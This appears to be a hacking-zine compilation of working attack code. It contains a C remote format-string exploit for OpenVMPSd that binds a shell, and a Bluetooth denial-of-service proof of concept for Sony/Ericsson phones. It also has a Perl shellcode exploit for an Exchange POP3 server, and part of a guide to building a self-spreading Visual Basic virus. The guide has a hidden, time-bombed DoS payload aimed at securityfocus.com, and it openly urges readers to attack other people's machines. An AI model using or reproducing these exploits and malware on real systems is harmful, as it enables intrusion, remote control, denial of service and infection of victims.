+ . . . . . . . . . . .  Gotfault Sec . . . . . . . . . . . . . . .
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+006x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*006
+
+
+/*OpenVMPSd <= 1.3 Remote Format String Exploit
+                            (Multiple Targets)	890	-Gotfault Security*/
+/*
+ * gexp-openvmpsd.c
+ *
+ * OpenVMPSd v1.3 Remote Format String Exploit
+ * Copyright (C) 2005 Gotfault Security
+ *
+ * Bug found and developed by: barros and xgc
+ *
+ * Original Reference:
+ * http://gotfault.net/research/exploit/gexp-openvmpsd.c
+ *
+ */
+
+#include <getopt.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+#include <netdb.h>
+#include <errno.h>
+#include <netinet/in.h>
+#include <stdio.h>
+
+/*==[ Prototypes ]==*/
+void Usage(char *);
+void fatal(char *);
+int  CreateEvilBuffer(int, int, int, int, char *);
+void ExecuteShell(int);
+void SendBuffer(int , char *, int);
+int  CreateUdpSocket(void);
+int  ConectToHost(char *, int);
+
+/*==[ Defines ]==*/
+#define	DEFAULT_PORT		1589	// Default server port
+#define BIND_PORT		31337	// Default port to bind
+#define NOPSIZE			50	// Do not change this value cause the shellcode space is "limited"
+#define NOP			0x90	// Nop value
+#define PAD			"..."	// Format string alignment
+#define PORT_OFFSET		29	// Offset to fix the shellcode
+
+/*==[ Targets ]==*/
+struct
+{
+	char	*Name;
+	int	Gotaddr;
+	int	Retaddr;
+	int	Pop;
+}Targets[] =
+	{
+		"OpenVMPSd v1.3 @ Slackware 10.0",
+		0x0804e57c,
+		0xbffff4f5,
+		19,
+
+		"OpenVMPSd v1.3 @ Debian 3.0 Linux",
+                0x0804d0f8,
+		0xbffff7ac,
+		29,
+
+		"OpenVMPSd v1.3 @ Fedora Core 2",
+		0x0804d0f8,
+		0xbffff7ac,
+		19,
+
+		// Finish
+		0,
+		0,
+		0,
+		0
+	};
+
+/*==[ Shellcode by Marco Ivaldi <raptor@0xdeadbeef.info> ]==*/
+char shellcode[] =
+        "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
+        "\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80"
+        "\x89\xc7\x52\x66\x68"
+        "BP" // Port to bind
+        "\x43\x66\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80"
+        "\xb0\x66\xb3\x04\xcd\x80"
+        "\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80"
+        "\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80"
+        "\x41\xe2\xf8\x51\x68n/sh\x68//bi\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+/*==[ OpenVMPSd UDP packet header ]==*/
+#define SIZE_OF_HEADER 14
+char header[] = "\x41\x01\x41\x01\x41\x41\x41\x41\x00\x00\x0c\x02";
+
+int main(int argc, char **argv)
+{
+	extern  char		*optarg;
+	extern  int		optind;
+		char		opt;
+		char		*Host = NULL;
+		int		Port = DEFAULT_PORT;
+		int		BindPort = BIND_PORT;
+		int		TargetNumber = 0;
+		int		Sock,i;
+		char		*EvilBuffer;
+		int		BufLen;
+
+	fprintf(stdout,"\n--=[ OpenVMPSd Remote Format String Exploit ]\n\n");
+	
+	// Process arguments
+	while ( (opt = getopt(argc,argv,"h:t:p:r:")) != EOF)
+	{
+		switch(opt)
+		{
+			case 'r':
+				BindPort = atoi(optarg);
+				if(!BindPort) Usage(argv[0]);
+			break;
+			case 'p':
+				Port = atoi(optarg);
+				if(!Port) Usage(argv[0]);
+			break;
+			case 't':
+				TargetNumber = atoi(optarg);
+			break;
+			case 'h':
+				Host = optarg;
+			break;
+			default: Usage(argv[0]);
+			break;
+		}
+	}
+	if(Host == NULL) Usage(argv[0]);
+
+	// Verify target
+	for(i=0;;i++)
+		if(Targets[i].Name == 0) break;
+	if(--i<TargetNumber) Usage(argv[0]);
+
+	fprintf(stdout,"[*] Target plataform      : %s\n",Targets[TargetNumber].Name);
+	fprintf(stdout,"[*] Target host           : %s\n",Host);
+	fprintf(stdout,"[*] Target port           : %u\n",Port);
+	fprintf(stdout,"[*] Bind to port          : %u\n",BindPort);
+	fprintf(stdout,"[*] Target GOT            : %#010x\n",Targets[TargetNumber].Gotaddr);
+	fprintf(stdout,"[*] Target Retaddr        : %#010x\n",Targets[TargetNumber].Retaddr);	
+	fprintf(stdout,"[*] Target POP            : %d\n\n",Targets[TargetNumber].Pop);
+
+	fprintf(stdout,"[*] Connecting\t\t  : ");
+	fflush(stdout);
+	Sock = ConectToHost(Host,Port);
+	if(Sock == -1) fatal("Could not connect");
+	else fprintf(stdout,"done\n");
+
+	fprintf(stdout,"[*] Creating EvilBuffer\t  : ");
+	fflush(stdout);
+	EvilBuffer = (char *)malloc(strlen(shellcode)+NOPSIZE+strlen(PAD)+515);
+	if(!EvilBuffer) fatal("Out of memory");
+	BufLen = CreateEvilBuffer(Targets[TargetNumber].Gotaddr,Targets[TargetNumber].Retaddr,Targets[TargetNumber].Pop,BindPort,EvilBuffer);
+	fprintf(stdout,"done\n");
+	
+	fprintf(stdout,"[*] Attacking\t\t  : ");
+	fflush(stdout);
+	SendBuffer(Sock,EvilBuffer,BufLen);
+	fprintf(stdout,"done\n");
+
+	close(Sock);
+
+	sleep(1);
+
+        Sock = ConectToShell(Host,BindPort);
+
+        if(Sock == -1) {
+		fprintf(stdout,"[*] Exploit Failed.\n\n");
+		exit(0);
+	}
+        else {
+		fprintf(stdout,"[*] Spawning Shell...\n\n");
+		ExecuteShell(Sock);
+	        close(Sock);
+	}
+}
+
+void SendBuffer(int Sock, char *Buffer, int size)
+{
+	if(send(Sock,Buffer,size,0) == -1)
+		fatal("SEND");
+}
+
+int ConectToHost(char *Host,int Port)
+{
+	struct 		sockaddr_in server;
+	struct 		hostent *hp;
+	int 		s;
+
+	server.sin_family = AF_INET;
+	hp = gethostbyname(Host);
+	if(!hp) return(-1);
+
+	memcpy(&server.sin_addr,hp->h_addr,hp->h_length);
+	server.sin_port = htons(Port);
+
+	s = socket(PF_INET,SOCK_DGRAM,0);
+	if(connect(s,(struct sockaddr *)&server, sizeof(server)) < 0)
+		return(-1);
+
+	return(s);
+}
+
+int ConectToShell(char *Host,int Port)
+{
+        struct          sockaddr_in server;
+        struct          hostent *hp;
+        int             s;
+
+        server.sin_family = AF_INET;
+        hp = gethostbyname(Host);
+        if(!hp) return(-1);
+
+        memcpy(&server.sin_addr,hp->h_addr,hp->h_length);
+        server.sin_port = htons(Port);
+
+        s = socket(PF_INET,SOCK_STREAM,0);
+        if(connect(s,(struct sockaddr *)&server, sizeof(server)) < 0)
+                return(-1);
+
+        return(s);
+}
+
+int CreateEvilBuffer(int GOT, int RETADDR, int POP, int BINDTOPORT, char *buffer)
+{
+	char		*nops = malloc(NOPSIZE+1);
+	char		*ptr;
+	unsigned short	*len;
+	unsigned short	*portPtr = (unsigned short *)(shellcode+PORT_OFFSET);
+
+	// Fix shellcode
+	*portPtr = htons(BINDTOPORT);
+
+	// Header
+	ptr = buffer;
+	memcpy(ptr,header,12);
+	ptr += SIZE_OF_HEADER;
+	len = (unsigned short *)(buffer + SIZE_OF_HEADER - 2);
+
+	// Create Nops
+	bzero(nops,NOPSIZE+1);
+	memset(nops,NOP,NOPSIZE);
+	
+	// Create format string attack
+	sprintf(ptr,
+		PAD
+		"%c%c%c%c"
+                "%c%c%c%c"
+                "%%.%dd"
+                "%%%d$hn"
+                "%%.%dd"
+                "%%%d$hn"
+                "%s%s",
+                ((u_long)GOT),
+                ((u_long)GOT >> 8),
+                ((u_long)GOT >> 16),
+                ((u_long)GOT >> 24),
+                ((u_long)GOT+2),
+                (((u_long)GOT+2) >> 8),
+                (((u_long)GOT+2) >> 16),
+                (((u_long)GOT+2) >> 24),
+                ((RETADDR & 0x0000FFFF) - 9 - 63),
+                POP,
+                (((RETADDR & 0xFFFF0000)>>16) + 0x10000 - (RETADDR & 0x0000FFFF)) - 1,
+                POP+1,nops,shellcode); 
+
+	*len = htons(strlen(ptr));
+
+	return (strlen(ptr)+14);
+}
+
+#define	STDIN			0
+#define STDOUT			1
+void ExecuteShell(int Sock)
+{
+	char 		buffer[1024 * 10];
+	int 		count;
+	fd_set 		readfs;
+
+	write(Sock,"uname -a;id\n",12);
+	while(1)
+	{
+		FD_ZERO(&readfs);
+		FD_SET(STDIN, &readfs);
+		FD_SET(Sock, &readfs);
+		if(select(Sock + 1, &readfs, NULL, NULL, NULL) > 0)
+		{
+			if(FD_ISSET(STDIN, &readfs))
+			{
+				if((count = read(STDIN, buffer, 1024)) <= 0)
+				{
+					if(errno == EWOULDBLOCK || errno == EAGAIN)
+						continue;
+					else
+					{
+						close(Sock);
+						exit(-1);
+					}
+				}
+				write(Sock, buffer, count);
+			}
+			if(FD_ISSET(Sock, &readfs))
+			{
+				if((count = read(Sock, buffer, 1024)) <= 0)
+				{
+					if(errno == EWOULDBLOCK || errno == EAGAIN)
+						continue;
+					else
+					{
+						close(Sock);
+						exit(-1);
+					}
+				}
+				write(STDOUT, buffer, count);
+			}
+		}
+	}
+}
+
+void fatal(char *ErrorMsg)
+{
+	fprintf(stderr,"ERROR - %s\n\n",ErrorMsg);
+	exit(1);
+}
+
+void Usage(char *Prog)
+{
+	int i;
+	fprintf(stderr,	"Usage: %s -h hostname <options>\n\n"
+			"Options:\n\n"
+			" -t target     : Select the target\n"
+			" -p portnumber : Sets a new port number <default: %d>\n"
+			" -r bindport   : Sets the port to bind a shell <default: %d>\n\n"
+			"Targets:\n\n",Prog,DEFAULT_PORT,BIND_PORT);
+
+	for(i=0;;i++)
+	{
+		if(Targets[i].Name != 0)
+			fprintf(stderr," [%u] %s\n",i,Targets[i].Name);
+		else
+			break;
+	}
+	fprintf(stderr,"\n");
+	exit(1);
+
+}
+
+
+007x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*007
+ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+  . . . . . . . . . . Bluetooth DoS . . . . . . . . . . . . . . . 
+ . . . . . . . . . . .  Pierre Betouin . . . . . . . . . . . . . .
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+007x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*007
+
+/* Sony/Ericsson reset display - PoC */
+/* Pierre BETOUIN - pierre.betouin@infratech.fr */
+/* 05-02-2006 */
+/* Vulnerability found using BSS fuzzer : */
+/* Download www.secuobs.com/news/05022006-bluetooth10.shml */
+/* */
+/* Causes anormal behaviours on some Sony/Ericsson */
+/* cell phones */
+/* Vulnerable tested devices : */
+/* - K600i */
+/* - V600i */
+/* - K750i */
+/* - W800i */
+/* - And maybe other ones... */
+/* */
+/* Vulnerable devices will slowly turn their screen into */
+/* black and then display a white screen. */
+/* After a short period (~45sec), they will go back to */
+/* their normal behaviour */
+/* */
+/* gcc -lbluetooth reset_display_sonyericsson.c */
+/* -o reset_display_sonyericsson */
+/* ./reset_display_sonyericsson 00:12:EE:XX:XX:XX */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <bluetooth/bluetooth.h>
+#include <bluetooth/hci.h>
+#include <bluetooth/l2cap.h>
+
+#define SIZE 4
+#define FAKE_SIZE 1 // SIZE - 3 (3 bytes <=> L2CAP header)
+
+int main(int argc, char **argv)
+{
+char *buffer;
+l2cap_cmd_hdr *cmd;
+struct sockaddr_l2 addr;
+int sock, sent, i;
+
+if(argc < 2)
+{
+fprintf(stderr, "%s <btaddr>\n", argv[0]);
+exit(EXIT_FAILURE);
+}
+
+if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0)
+{
+perror("socket");
+exit(EXIT_FAILURE);
+}
+
+memset(&addr, 0, sizeof(addr));
+addr.l2_family = AF_BLUETOOTH;
+
+if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0)
+{
+perror("bind");
+exit(EXIT_FAILURE);
+}
+
+str2ba(argv[1], &addr.l2_bdaddr);
+
+if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0)
+{
+perror("connect");
+exit(EXIT_FAILURE);
+}
+
+if(!(buffer = (char *) malloc ((int) SIZE + 1)))
+{
+perror("malloc");
+exit(EXIT_FAILURE);
+}
+
+memset(buffer, 90, SIZE);
+
+cmd = (l2cap_cmd_hdr *) buffer;
+cmd->code = L2CAP_ECHO_REQ;
+cmd->ident = 1;
+cmd->len = FAKE_SIZE;
+
+if( (sent=send(sock, buffer, SIZE, 0)) >= 0)
+{
+printf("L2CAP packet sent (%d)\n", sent);
+}
+
+printf("Buffer:\t");
+for(i=0; i<sent; i++)
+printf("%.2X ", (unsigned char) buffer[i]);
+printf("\n");
+
+free(buffer);
+close(sock);
+return EXIT_SUCCESS;
+}
+
+
+010x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*010
+ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+  . . . . . . . . eXchange POP3 5.0.050203 0day . . . . . . . . . 
+ . . . . . . . . . . .  secura massine . . . . . . . . . . . . . .
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+010x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*010
+
+#!/usr/bin/perl -w        
+# for educational purposes only .   
+  use IO::Socket;
+                      if ($#ARGV<0) 
+                    { 
+                         print "\n write the target IP!! \n\n"; 
+                       exit; 
+                     } 
+                $buffer2 = "\x90"x1999999;
+                $mailf= "mail";
+                $rcptt ="rcpt to:<";
+                $buffer = "\x41"x4100;
+                $ret   = "\x80\x1d\xdc\x02";
+                $shellcode = "\xEB\x03\x5D\xEB\x05\xE8\xF8\xFF\xFF\xFF\x8B\xC5\x83\xC0\x11\x33".
+                      "\xC9\x66\xB9\xC9\x01\x80\x30\x88\x40\xE2\xFA\xDD\x03\x64\x03\x7C".
+                      "\x09\x64\x08\x88\x88\x88\x60\xC4\x89\x88\x88\x01\xCE\x74\x77\xFE".
+                      "\x74\xE0\x06\xC6\x86\x64\x60\xD9\x89\x88\x88\x01\xCE\x4E\xE0\xBB".
+                      "\xBA\x88\x88\xE0\xFF\xFB\xBA\xD7\xDC\x77\xDE\x4E\x01\xCE\x70\x77".
+                      "\xFE\x74\xE0\x25\x51\x8D\x46\x60\xB8\x89\x88\x88\x01\xCE\x5A\x77".
+                      "\xFE\x74\xE0\xFA\x76\x3B\x9E\x60\xA8\x89\x88\x88\x01\xCE\x46\x77".
+                      "\xFE\x74\xE0\x67\x46\x68\xE8\x60\x98\x89\x88\x88\x01\xCE\x42\x77".
+                      "\xFE\x70\xE0\x43\x65\x74\xB3\x60\x88\x89\x88\x88\x01\xCE\x7C\x77".
+                      "\xFE\x70\xE0\x51\x81\x7D\x25\x60\x78\x88\x88\x88\x01\xCE\x78\x77".
+                      "\xFE\x70\xE0\x2C\x92\xF8\x4F\x60\x68\x88\x88\x88\x01\xCE\x64\x77".
+                      "\xFE\x70\xE0\x2C\x25\xA6\x61\x60\x58\x88\x88\x88\x01\xCE\x60\x77".
+                      "\xFE\x70\xE0\x6D\xC1\x0E\xC1\x60\x48\x88\x88\x88\x01\xCE\x6A\x77".
+                      "\xFE\x70\xE0\x6F\xF1\x4E\xF1\x60\x38\x88\x88\x88\x01\xCE\x5E\xBB".
+                      "\x77\x09\x64\x7C\x89\x88\x88\xDC\xE0\x89\x89\x88\x88\x77\xDE\x7C".
+                      "\xD8\xD8\xD8\xD8\xC8\xD8\xC8\xD8\x77\xDE\x78\x03\x50\xDF\xDF\xE0".
+                      "\x8A\x88\xAB\x6F\x03\x44\xE2\x9E\xD9\xDB\x77\xDE\x64\xDF\xDB\x77".
+                      "\xDE\x60\xBB\x77\xDF\xD9\xDB\x77\xDE\x6A\x03\x58\x01\xCE\x36\xE0".
+                      "\xEB\xE5\xEC\x88\x01\xEE\x4A\x0B\x4C\x24\x05\xB4\xAC\xBB\x48\xBB".
+                      "\x41\x08\x49\x9D\x23\x6A\x75\x4E\xCC\xAC\x98\xCC\x76\xCC\xAC\xB5".
+                      "\x01\xDC\xAC\xC0\x01\xDC\xAC\xC4\x01\xDC\xAC\xD8\x05\xCC\xAC\x98".
+                      "\xDC\xD8\xD9\xD9\xD9\xC9\xD9\xC1\xD9\xD9\x77\xFE\x4A\xD9\x77\xDE".
+                      "\x46\x03\x44\xE2\x77\x77\xB9\x77\xDE\x5A\x03\x40\x77\xFE\x36\x77".
+                      "\xDE\x5E\x63\x16\x77\xDE\x9C\xDE\xEC\x29\xB8\x88\x88\x88\x03\xC8".
+                      "\x84\x03\xF8\x94\x25\x03\xC8\x80\xD6\x4A\x8C\x88\xDB\xDD\xDE\xDF".
+                      "\x03\xE4\xAC\x90\x03\xCD\xB4\x03\xDC\x8D\xF0\x8B\x5D\x03\xC2\x90".
+                      "\x03\xD2\xA8\x8B\x55\x6B\xBA\xC1\x03\xBC\x03\x8B\x7D\xBB\x77\x74".
+                      "\xBB\x48\x24\xB2\x4C\xFC\x8F\x49\x47\x85\x8B\x70\x63\x7A\xB3\xF4".
+                      "\xAC\x9C\xFD\x69\x03\xD2\xAC\x8B\x55\xEE\x03\x84\xC3\x03\xD2\x94".
+                      "\x8B\x55\x03\x8C\x03\x8B\x4D\x63\x8A\xBB\x48\x03\x5D\xD7\xD6\xD5".
+                      "\xD3\x4A\x8C\x88";
+
+                $enter  = "\x0d\x0a";
+                $connect = IO::Socket::INET ->new (Proto=>"tcp",
+                PeerAddr=> "$ARGV[0]",
+                PeerPort=>"25"); unless ($connect) { die "cant connect" }  
+                print "\nExchangepop3 v5.0  remote exploit by securma massine\n";
+                print "\n+++++++++++www.morx.org++++++++++++++++\n";              
+                $connect->recv($text,128); 
+                print "$text\n";
+                $connect->send($mailf . $enter); 
+                $connect->recv($text,128); 
+                print "$text\n";
+                $connect->send($rcptt . $buffer . $ret . $buffer2 .  $shellcode . $enter); 
+                print "\nsending exploit......\n\n";
+                 print "\ntelnet to  server port 9191 .........\n\n";
+
+
+
+011x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*011
+ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+  . . . . . . . . . . MS Virus c0ding . . . . . . . . . . . . . 
+ . . . . . . . . . . .  Two-Twenty . . . . . . . . . . . . . . .
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+011x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*011
+ ____________________________________________________________
+ |                                                           |
+ |-Guide to making source code viruses using MS Technologies-|
+ |___________________________________________________________|
+                       By Two-Twenty
+
+
+
+
+                 _______________________
+                /                       \
+                | Hi. Call Me Harper,    |
+                | leader of the American |
+                | revolution which will  |
+                | occur in Canada.       |
+                 \___________   ________/
+                             \  |    ~---_
+                              \ |    /    \
+                               \|   x \    |  
+                                   /,  \_ _?
+                                    {_   /
+                                    {___.|
+   
+
+
+
+0 -                   ___---=== T0K ===---___
+
+
+
+0 - Table 0f Kontentz
+
+1 - Intros
+
+2 - Psudocode and notes
+
+3 - Adding a back door
+
+4 - Adding a payload
+
+5 - Raw viral code
+
+6 - Viral Code attached to working program (final product)
+
+7 - Executing and spreading virus
+
+8 - Outros
+
+
+
+1 -                ___---=== Intros ===---___ 
+
+
+Hello. I am going to keep the commentary on this article
+short and sweet. This file is going to try to (re)introduce you
+to the lost art of source code viruses.
+
+If you hate any of the following you might enjoy this file:
+-Microsoft
+-People who like microsoft
+-Visual Basic 6.0
+-People who like visual basic 6.0
+-The open source scene
+-Full Disclosure of exploits and/or whitehats
+-Websites where you can upload your open source visual
+  basic programs for others to use, study and enjoy and/or the
+  people who use those sites.
+-People who like to use http://securityfocus.com to find exploits
+  so they can prawn boxes because they cant make their own
+  exploits.
+
+If you love any of the following you may enjoy this file:
+- Chaos/m4yh4m
+- Malware/Virus/Interesting Source Code
+- Ruining some one elses day
+- (D)DoSing http://securityfocus.com
+
+
+Chapter two is just an introduction to the code and how it will work.
+
+Chapter three is the details of how we will add a back door and what
+functions the back door will provide us. The back door part of the
+virus is optional, and is not needed, but I included it anyways.
+
+Chapter four is where I add a payload to the virus.
+
+Chapter five is the raw virus code. It is the code as it would be
+if it were not attached to any other program. This part of the code can
+be used to infect other .frm files. I have included this because
+it makes the virus easyer to study and understand.
+
+Chapter six is the virus as it would be if attached to another program.
+Use the code in chapter six to attack computers as explained in
+chapter seven.
+
+Do you know nothing about Visual basic, programming, viruses or
+even computers? Thats ok! I make it simple enough for any 
+script toddler to use this virus source to attack other 
+programmers computers and take control of them! Just skip to chapter
+six, Executing and spreading virus.
+
+Chapter seven ties up loose ends.
+
+Please note that none of the code in this article is wrapped at 80 colums.
+This file is aprox. 35 pages long while in notepad at a 
+1024X768 Resolution.
+
+A final note before reading on: I wrote all the code in vb6.0 and tested
+it many times. To my knowlege this program does work with logic and
+syntax errors minimal. Spelling and grammer errors are a differnt story
+tho. I wrote this file for the technical aspect, not to get a good grade
+in English 101.
+
+
+2 -       ___---=== Psudocode and Understanding this virus ===---___
+
+Source code viruses were much more common in the early 90s. They are rarely
+seen any more except in old texts. Common source code viruses could be found
+written in Basic, C and even batch.
+
+Most of them were extreemly simple viruses and did little more than write
+over other source code the virus found, destorying the program in the process.
+
+This piece of code I have written does not destroy the source code that it
+infects and leaves the program functional while still infecting other files
+in the background while the code runs as inteded.
+
+If you read the last k-1ine you might have read the 
+article titled "Another Malware File" By Aftermath. 
+
+This one is an extention of the file that Aftermath wrote.
+
+In a nutshell, this virus finds .frm files, which are visual basic source
+files stored in plain text, and adds its own code it them. One thing
+Aftermaths virus did not do was spread without potentialy destroying
+essential code in the original source code of the .frm file. This new
+improved virus does this. It also does a lot of things the original does
+not do. 
+
+The source code you are about to see is another source code virus, except
+instead of adding a bunch of text to the end of the frm file,
+it adds two chunks of code at the beginning of the first two
+sub functions it finds. This code is a lot less prone to 
+errors and a little less obvious to detect.
+
+ Here is an example of some high
+level VB psudocode that is NOT yet infected
+(pretend you are reading the source code in notepad):
+________________________________________________
+|#form1.frm - Notepad                        _=X|
+| --------------------------------------------- |
+|                                               |
+|Subfunction Load Form()                        |
+|                                               |
+|  print in message box "hello, welcome!"       |
+|                                               |
+|End Subfuction                                 |
+|                                               |
+|                                               |
+|                                               |
+|                                               |
+|                                               |
+|Subfunction Unload Form()                      |
+|                                               |
+|  print in message box "goodbye!"              |
+|                                               |
+|End Subfunction                                |
+|                                               |
+|                                               |
+|                                               |
+ ------------------------------------------------
+
+
+Ok, so a regualr application. Here is what it will look like
+when it's hit by this virus:
+
+
+________________________________________________
+|#form1.frm - Notepad                        _=X|
+| --------------------------------------------- |
+|                                               |
+|Subfunction Load Form()                        |
+|                                               |
+|  find original .frm file for the virus source | <- virus source here
+|                                               |    (first part)
+|  find .frm files and store them on computer   | <- virus source here
+|                                               |    (first part)
+|  print in message box "hello, welcome!"       | <- original source
+|                                               |
+|End Subfuction                                 |
+|                                               |
+|                                               |
+|                                               |
+|                                               |
+|                                               |
+|Subfunction Unload Form()                      |
+|                                               |
+|  find functions in found frm files            | <- virus source here
+|                                               |    (second part/payload)
+|  infect functions with virus source           | <- virus source here
+|                                               |    (second part/payload)
+|  print in message box "goodbye!"              | <- original source
+|                                               |
+|End Subfunction                                |
+|                                               |
+|                                               |
+|                                               |
+ ------------------------------------------------
+
+
+Of course it's not that simple, but thats what it does. If there are
+more than two subfunctions it ignores the rest. It just finds the first
+two functions to infect. If there is only one function or no function or
+even if the .frm file is empty for some reason, it does not infect. It
+will only infect if it finds the beginning and end of two functions.
+
+I have tried to make the loops as tight and quickly excuted as possible.
+Because this is a source code virus, the less code that is copied around
+the quicker the execution is executed.
+
+If you are intent on studying this code then there might be a few built in
+visual basic 6.0 functions you are unfamilar with. I use this one function 
+that is not often used:
+
+"FreeFile" will place a number as the next free open file to use.
+When doing VB you can only have so many files open at once. I forget how
+many, but there is a limit. You cant use two file numbers at the same time.
+For example, you cant do this:
+
+open "c:\autoexec.bat" for input as #1
+open "c:\config.sys" for binary read as #1
+
+That's a big nono. You will get errors. This code uses inputs and outputs,
+but because its infecting already made code, we dont want to use #1 if
+file #1 is already in use. Instead we do this:
+
+dim x as integer
+x = FreeFile
+
+Open "C:\autoexec.bat" for input as #x
+
+That works fine. If the code already opend up #1 and #2 and #3 and #4, X will be 5.
+
+There is not too much more to say except I use lots of "Shell" functions.. these
+allow commands to be fed into cmd.exe while allowing the vb program to continue to
+run without waiting for the command to finish executing.
+
+If you need this code to run really fast, take out all of the comments (Except
+for the markers!) and nice paragraph spacing. This will mean it will be harder
+to debug if something goes wrong but it also means less code to copy
+around and quicker infection.
+
+
+
+3 -   ___---=== Adding a back door ===---___
+
+Ok. I decided NOT to add a back door into this version of the virus. If you want
+to have a backdoor in your own virus then you can write one on your own. It's
+not hard to write a back door into this virus. I would add it at the very
+end of the source as commented out text, then bring that text to a text file
+and compile it using vb6's command line compiler. Voula! Instant EXE back
+door. Use your n3njh4r skills to make it run at start up.
+
+The tools I create are my own and no one elses. You should have this same 
+philosophy. If you want to add a back door, make your own, and replace
+the included payload that I added. Doing this will be very simple because
+all you will have to do is replace my "payload" code with your backdoor code
+
+
+
+4 -     ____---=== Adding a payload ===---___
+
+Ok, so instead of adding a back door into this version of the virus, I decided 
+instead to add a payload. What does the payload do you might ask? 
+
+It DoSs http://securityfocus.com by sending an http request from a socket
+
+Why security focus? Because they publish all the underground soruce codes.
+When writing this viurs I thought about putting a very extensive bot that would
+connect to dalnet. This bot would respond to many commands such as DoS functions,
+proxie functions, keylogger functions, port scanner functions and a few other
+not so important functions. All of these would be controled through IRC creating
+a botnet. After thinking about it for a while, I decided that this is unwise.
+Anydumbshit could place attacks on the visual basic open source community with my code
+that I so tediously written. This would put the bot code on high alert lists and
+shit. People would recognize it right away if I tried to use it for anything
+important, and there might even be "cleaning tools" written by the very
+security focus people that I dispise. This would be doulbe fold self distruction.
+
+So instead I just included a small piece of code that will DoS that dumb site. 
+
+This is killing two birds with one stone. If anyone thinks its cool to spread
+a virus, then security focus will be hit with lots of traffic, and the random
+script kiddy will be cought and put in jail where he will recieve lots of action
+in the reer, while still allowing people who really want to learn about the dark
+side of coding to do so.
+
+The DoS code I included simply compiles itself to an exe, burries itself in
+the \system32 file folder and a line of code is written to autoexec.bat so it gets
+executed every time the computer starts. It will DoS that beiotch with all the
+sockets the computer can handle, essentialy fuXoring up the computer that it is 
+hosted on. This makes the computer obvoisly broken - so we do a time bomb. Why
+a time bomb? Well when we release it, we dont want the computers we are infecting
+to be fucked up right away - we want them to spread the virus around more, so say
+we release the virus on Febuary 1st. This would give the virus a month to spread
+before it starts its payload, which will occur immediately after valentines day.
+
+I hate valentines day. Hearts suck. In kindergarden we used to pass around 
+hearts to all of our friends. I had the clever idea of passing around farts
+instead. My teacher called me a shithead. I never liked valentines day after
+that.
+
+So this gives it enough time to spread, but not too much time, because then
+a lot of people might find the executable, or even worse, a cleaner tool
+might be created to clean the virus traces. Remember, this is a source code virus
+that is sitting there in plain text. Its not hard to detect.
+
+I used 2000 sockets per host to DoS the address. This may not look like a lot, but
+if the virus infects 10 computers, thats a potential 20000 connections.
+
+I additionaly added 200 sockets to DoS port 22 which will fuck the admins around if
+they try to remotely fix the DoS attacks that are comming at them.
+
+One last note before getting onto the payload source. I added a few tricks that I
+learned over time that will help the prevention of shutting down the program. One
+of those tricks is in the sub function "Form_Terminate".
+
+When some one tries to shut down the program, the last thing the program will do
+before completly shutting down is call itself. This wont work 100% of the time,
+but it often does.
+
+Here is the source code for the DoS function.
+
+
+'----%<---- cut here----%<---- cut here----%<---- cut here----%<---- cut here----%<-
+
+VERSION 5.00
+Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
+Begin VB.Form Form1 
+   Caption         =   "Form1"
+   ClientHeight    =   465
+   ClientLeft      =   1665
+   ClientTop       =   1935
+   ClientWidth     =   1560
+   Icon            =   "Form1.frx":0000
+   LinkTopic       =   "Form1"
+   ScaleHeight     =   465
+   ScaleWidth      =   1560
+   Begin MSWinsockLib.Winsock Winsock1 
+      Index           =   0
+      Left            =   0
+      Top             =   0
+      _ExtentX        =   741
+      _ExtentY        =   741
+      _Version        =   393216
+   End
+End
+Attribute VB_Name = "Form1"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = False
+
+Private Sub Form_Load()
+
+'built in vb stealth functions
+Form1.Visible = False
+doevents
+App.TaskVisible = False
+
+'time bomb.. must be March - December when it DoSs
+Dim strmonth As String
+strmonth = Mid(Date, 4, 2)
+If strmonth < 3 Then End
+
+Dim i As Integer
+Dim load_sockets As Boolean
+
+'we only want to load the sockets once.
+If load_sockets = False Then
+    For i = 1 To 2200
+        Load Winsock1(i)
+        DoEvents
+        load_sockets = True
+    Next i
+End If
+
+'2000 sockets will DoS port 80
+For i = 1 To 2000
+    Winsock1(i).RemoteHost = "http://securityfocus.com"
+    Winsock1(i).RemotePort = "80"
+    Winsock1(i).Close
+    DoEvents
+    Winsock1(i).Connect
+Next i
+
+
+'200 sockets will DoS port 22
+For i = 2001 To 2200
